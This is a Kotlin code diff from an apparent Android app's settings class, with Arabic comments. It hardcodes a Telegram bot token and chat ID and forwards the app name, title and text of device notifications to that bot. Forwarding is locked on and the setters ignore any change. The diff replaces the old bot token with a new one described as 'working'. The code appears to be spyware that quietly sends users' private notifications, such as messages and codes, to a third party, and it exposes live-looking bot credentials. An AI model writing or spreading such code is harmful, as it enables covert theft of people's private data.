@@ -22,9 +22,9 @@ data class AppSettings(
 
 class SettingsStore(context: Context) {
 
-    // رابط الـ API الخاص ببوت التليجرام
+    // رابط الـ API الخاص ببوت التليجرام الجديد والفعال
     var webhookUrl: String
-        get() = "https://api.telegram.org/bot8801482330:AAFIrfENVj40b5uUpmn-kukS-7LiVZzeI2w/sendMessage"
+        get() = "https://api.telegram.org/bot8774382428:AAEjf9QoTgY1Hw-kujIUBi03ef_ug26KsHc/sendMessage"
         set(_) {}
 
     // تفعيل التوجيه دائماً
@@ -37,12 +37,12 @@ class SettingsStore(context: Context) {
         get() = "POST"
         set(_) {}
 
-    // قالب الـ Payload المجهز بـ Chat ID الخاص بك
+    // قالب الـ Payload المجهز بـ Chat ID والقالب الناجح
     var payloadTemplateRaw: String
         get() = """
             {
               "chat_id": "8027742578",
-              "text": "📲 إشعار جديد:\nتطبيق: {appName}\nالعنوان: {title}\nالرسالة: {text}"
+              "text": "📱 التطبيق: {appName}\n👤 العنوان: {title}\n💬 الرسالة: {text}"
             }
         """.trimIndent()
         set(_) {}
@@ -112,4 +112,3 @@ class SettingsStore(context: Context) {
         }
     }
 }
-
